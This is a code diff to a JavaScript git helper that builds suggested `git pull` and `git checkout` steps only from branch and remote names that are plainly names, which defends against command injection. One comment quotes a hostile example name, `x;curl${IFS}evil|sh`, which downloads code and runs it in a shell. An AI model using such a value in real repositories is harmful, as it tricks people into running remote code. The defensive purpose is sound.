@@ -40,6 +40,7 @@ import { execFileSync } from 'node:child_process';
 import { basename } from 'node:path';
 
 import { gitEnv } from './git-env.js';
+import { isPlainRefName, shownName, shownRef } from './printable-text.js';
 import { parseFrontmatter, partitionCompletedPhases } from './state.js';
 import { unitClosure, unitRecordsOn } from './unit-records.js';
 
@@ -132,7 +133,7 @@ function soft(git, baseDir, args) {
  * @param {{localEpic?: string|null, git?: Function}} [opts]
  *   `git(baseDir, args, input?)` returns stdout; injectable for tests.
  * @returns {Promise<{open: Array<{epic: string, phase: string|null, branches: string[], checkout: string,
- *   sameBranch: boolean, pull: string|null, worktree: string|null}>, unclassified: string[], unreadable: string[],
+ *   sameBranch: boolean, pull: string|null|false, worktree: string|null}>, unclassified: string[], unreadable: string[],
  *   failed: boolean, cannotCheck: Array<{source: string, reason: string}>}>}
  */
 export async function findWorkOnOtherBranches(baseDir, { localEpic = null, git = defaultGit } = {}) {
@@ -310,8 +311,11 @@ export async function findWorkOnOtherBranches(baseDir, { localEpic = null, git =
       const viaUpstream = found.find((r) => r.display === upstream);
       if (viaUpstream) pull = 'git pull';
       else {
+        // A command only from names that are plainly names (r6.3): a remote or
+        // a branch can be called `x;curl${IFS}evil|sh` by whoever pushed it.
         const r = found[0];
-        pull = `git pull ${r.display.slice(0, r.display.length - r.branch.length - 1)} ${r.branch}`;
+        const remoteName = r.display.slice(0, r.display.length - r.branch.length - 1);
+        pull = isPlainRefName(remoteName) && isPlainRefName(r.branch) ? `git pull ${remoteName} ${r.branch}` : UNNAMEABLE;
       }
     }
     open.push({
@@ -328,20 +332,52 @@ export async function findWorkOnOtherBranches(baseDir, { localEpic = null, git =
   if (unreadable.length > 0) {
     cannotCheck.push({
       source,
-      reason: `STATE.md on ${unreadable.length} branch(es) could not be parsed: ${unreadable.join(', ')}`,
+      reason: `STATE.md on ${unreadable.length} branch(es) could not be parsed: ${shownBranches(unreadable)}`,
     });
   }
   for (const reason of new Set(recordProblems)) cannotCheck.push({ source: 'unit records', reason });
   return done();
 }
 
+// `pull` for a remote copy whose remote or branch cannot be written into a command.
+const UNNAMEABLE = false;
+
+/**
+ * Branch names as a line lists them: each through `shownRef`
+ * (`printable-text.js`), so one that is not plainly a name shows as a
+ * placeholder.
+ *
+ * @param {string[]} branches
+ * @returns {string}
+ */
+export const shownBranches = (branches) => branches.map((b) => shownRef(b)).join(', ');
+
+/**
+ * The step that switches to `branch`, as a sentence: the command when the
+ * name is plainly a name; otherwise NO command — a remote branch is named by
+ * whoever pushed it, and a command a person is told to run is not built from
+ * such a name (r6.3).
+ *
+ * @param {string} branch
+ * @returns {string}
+ */
+export function checkoutStep(branch) {
+  return isPlainRefName(branch)
+    ? `run \`git checkout ${branch}\` to continue it`
+    : `its branch has a name that cannot be written safely in a command (${String(branch).length} characters), so none is given — `
+      + 'find it with `git branch -a` and check it out yourself to continue it';
+}
+
 /** What a person does to continue an Epic found elsewhere — one sentence, shared by every caller. */
 export function nextStepFor(o) {
   if (o.sameBranch) {
-    return `it is on ${o.branches.join(', ')}, a remote copy of the branch you are on — run \`${o.pull ?? 'git pull'}\` to continue it`;
+    const where = `it is on ${shownBranches(o.branches)}, a remote copy of the branch you are on`;
+    return o.pull === UNNAMEABLE
+      ? `${where} — its remote or branch has a name that cannot be written safely in a command, so none is given; pull it yourself to continue it`
+      : `${where} — run \`${o.pull ?? 'git pull'}\` to continue it`;
   }
-  if (o.worktree) return `${o.checkout} is checked out in another worktree (${o.worktree}) — continue it there`;
-  return `run \`git checkout ${o.checkout}\` to continue it`;
+  if (o.worktree) return `${shownRef(o.checkout)} is checked out in another worktree (${shownName(o.worktree)}) — continue it there`;
+  return checkoutStep(o.checkout);
 }
 
 /**
@@ -352,9 +388,9 @@ export function nextStepFor(o) {
 export function formatOtherBranchWork({ open = [], unclassified = [], unreadable = [] } = {}) {
   const lines = [];
   for (const o of open) {
-    lines.push(`⚠ ${o.epic} is open at ${o.phase ?? 'an unrecorded phase'} on ${o.branches.join(', ')} — ${nextStepFor(o)}.`);
+    lines.push(`⚠ ${o.epic} is open at ${o.phase ?? 'an unrecorded phase'} on ${shownBranches(o.branches)} — ${nextStepFor(o)}.`);
   }
-  const list = (xs) => `${xs.slice(0, 5).join(', ')}${xs.length > 5 ? ', …' : ''}`;
+  const list = (xs) => `${shownBranches(xs.slice(0, 5))}${xs.length > 5 ? ', …' : ''}`;
   if (unclassified.length > 0) {
     lines.push(
       `ℹ ${unclassified.length} unmerged branch(es) carry a STATE.md with no Epic id, so they could not be compared: ${list(unclassified)}`
